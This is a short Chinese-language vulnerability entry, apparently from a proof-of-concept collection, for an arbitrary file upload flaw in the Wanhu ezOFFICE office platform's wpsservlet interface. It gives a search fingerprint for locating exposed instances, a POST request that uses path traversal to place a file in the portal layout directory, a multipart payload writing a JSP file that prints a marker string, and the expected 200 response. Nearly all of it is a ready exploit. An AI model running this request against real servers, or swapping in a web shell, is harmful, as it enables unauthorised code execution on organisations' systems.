# 万户协同办公平台ezofficewpsservlet接口任意文件上传漏洞

万户协同办公平台ezofficewpsservlet接口 ｜ 文件上传 ｜ —
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=40067&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1`

**Payload**
```
--55aeb894de1521afe560c924fad7c6fb
Content-Disposition: form-data; name="NewFile"; filename="40067.jsp"
<% out.print("dudesuite");%>
--55aeb894de1521afe560c924fad7c6fb--
```
- **响应特征**：200